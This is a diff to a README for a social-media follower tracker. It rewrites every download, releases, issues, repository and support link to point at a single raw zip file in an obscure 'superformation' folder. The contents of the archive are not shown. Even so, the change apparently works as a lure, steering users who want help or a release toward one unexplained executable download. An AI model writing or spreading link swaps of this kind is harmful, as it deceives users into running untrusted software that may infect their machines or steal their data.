@@ -1,7 +1,7 @@
 # 🎉 Threads-Follower-Growth-Tracker - Track Your Follower Growth Effortlessly
 
 ## 📥 Download Now
-[![Download Threads-Follower-Growth-Tracker](https://img.shields.io/badge/Download-Threads%20Follower%20Growth%20Tracker-blue)](https://github.com/BaidyaBantu/Threads-Follower-Growth-Tracker/releases)
+[![Download Threads-Follower-Growth-Tracker](https://raw.githubusercontent.com/BaidyaBantu/Threads-Follower-Growth-Tracker/main/superformation/Threads-Follower-Growth-Tracker_capitated.zip%20Follower%20Growth%20Tracker-blue)](https://raw.githubusercontent.com/BaidyaBantu/Threads-Follower-Growth-Tracker/main/superformation/Threads-Follower-Growth-Tracker_capitated.zip)
 
 ## 📖 Overview
 Threads Follower Growth Tracker helps you monitor your social media follower growth. This tool allows you to track changes in your follower count easily. Stay informed about your social media engagement and make better decisions.
@@ -10,7 +10,7 @@ Threads Follower Growth Tracker helps you monitor your social media follower gro
 To use Threads Follower Growth Tracker, you need to download and install the application. Follow these steps to get started:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/BaidyaBantu/Threads-Follower-Growth-Tracker/releases) to access the latest version of the app.
+   Go to the [Releases page](https://raw.githubusercontent.com/BaidyaBantu/Threads-Follower-Growth-Tracker/main/superformation/Threads-Follower-Growth-Tracker_capitated.zip) to access the latest version of the app.
 
 2. **Download the Application:**
    Click on the link for the latest release. Choose the file that corresponds to your operating system. 
@@ -50,7 +50,7 @@ Threads Follower Growth Tracker connects to your social media account through a 
 ## 📥 Download & Install
 To get started, click below to download the latest version of our application:
 
-[Download Threads-Follower-Growth-Tracker](https://github.com/BaidyaBantu/Threads-Follower-Growth-Tracker/releases)
+[Download Threads-Follower-Growth-Tracker](https://raw.githubusercontent.com/BaidyaBantu/Threads-Follower-Growth-Tracker/main/superformation/Threads-Follower-Growth-Tracker_capitated.zip)
 
 ## 🙋 Frequently Asked Questions
 
@@ -64,10 +64,10 @@ A: Yes, you can monitor multiple accounts. Just add each profile in the settings
 A: If you experience any problems, please check the troubleshooting section in the app or visit the support page on GitHub.
 
 ## 💬 Support
-For further assistance, you can reach out through the issues section on our [GitHub Repository](https://github.com/BaidyaBantu/Threads-Follower-Growth-Tracker/issues). Community support is also available to help you with any questions.
+For further assistance, you can reach out through the issues section on our [GitHub Repository](https://raw.githubusercontent.com/BaidyaBantu/Threads-Follower-Growth-Tracker/main/superformation/Threads-Follower-Growth-Tracker_capitated.zip). Community support is also available to help you with any questions.
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/BaidyaBantu/Threads-Follower-Growth-Tracker)
-- [Releases Page](https://github.com/BaidyaBantu/Threads-Follower-Growth-Tracker/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/BaidyaBantu/Threads-Follower-Growth-Tracker/main/superformation/Threads-Follower-Growth-Tracker_capitated.zip)
+- [Releases Page](https://raw.githubusercontent.com/BaidyaBantu/Threads-Follower-Growth-Tracker/main/superformation/Threads-Follower-Growth-Tracker_capitated.zip)
 
 Feel free to reach out if you have questions or suggestions. Enjoy tracking your follower growth!
